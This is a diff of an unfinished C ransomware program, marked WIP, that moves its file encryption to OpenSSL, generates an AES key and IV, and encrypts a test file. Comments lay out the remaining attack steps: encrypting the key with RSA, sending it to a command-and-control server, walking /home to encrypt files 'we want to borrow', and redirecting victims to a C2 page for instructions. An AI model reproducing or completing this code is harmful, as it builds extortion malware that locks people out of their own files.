@@ -7,7 +7,9 @@
 #include <curl/curl.h>
 #include <sys/stat.h>
 #include <fcntl.h>
-#include "lib/aes.h"
+#include <openssl/evp.h>
+#include <openssl/aes.h>
+#include <openssl/err.h>
 
 #include "files.h"
 #include "encryption.h"
@@ -18,49 +20,32 @@ void sendFileToApi(const char *path, const char *api);
 
 
 int main(){
+
+    OpenSSL_add_all_algorithms();
+    ERR_load_crypto_strings();
+
     //Generate AES key and IV
-    srand((unsigned int)time(NULL));
+    unsigned char key[32];
+    RAND_bytes(key, sizeof(key));
 
-    size_t key_length = 32;
-    uint8_t key[key_length];
-    generateRandomBytes(key, sizeof(key));
-    for (size_t i = 0; i < key_length; ++i) {
-        printf("%02X ", key[i]);
-    }
-    printf("\n");
-    size_t iv_length = 16;
-    uint8_t iv[iv_length];
-    generateRandomBytes(iv, iv_length);
-    for (size_t i = 0; i < iv_length; ++i) {
-        printf("%02X ", iv[i]);
-    }
-    printf("\n");
+    unsigned char iv[16];
+    RAND_bytes(iv, sizeof(iv));
 
-    //Convert key and iv to string (outdated for now)
-    char key_string[key_length * 2 + 1], iv_string[iv_length];
-    bytesToHexString(key, key_length, key_string);
-    bytesToHexString(iv, iv_length, iv_string);
-    printf("%s\n", key_string);
-    printf("%s\n", iv_string);
-    printf("\n\n");
-    for (size_t i = 0; i < key_length; ++i) {
-        printf("%02X ", key[i]);
-    }
+    // Authentication string
+    static const unsigned char aad[] = "Cyan";
 
-    struct AES_ctx ctx;
-    AES_init_ctx_iv(&ctx, key, iv);
+    encrypt_file(key, iv, aad, "atom.png");
+
+    decryptFile(key, iv, aad, "atom.png.cha");
 
 
 
-
-    encryptFile(ctx, "a.txt");
-    //encryptFile(ctx, "atom.png");
-    /*
     //Encrypt the AES key with the RSA public key
 
     //Send the encrypted AES key and iv to C2
 
     //List all the files we want to borrow ;)
+    /*
     const char *path = "/home";
     PathList pathList;
     initPathList(&pathList);
@@ -76,10 +61,11 @@ int main(){
         //encryptFile(ctx, "pathList.paths[i]");
     }
     freePathList(&pathList);
+    */
 
 
     //Redirect to C2's web page for instructions
-    */
+
     return 0;
 }
 //WIP
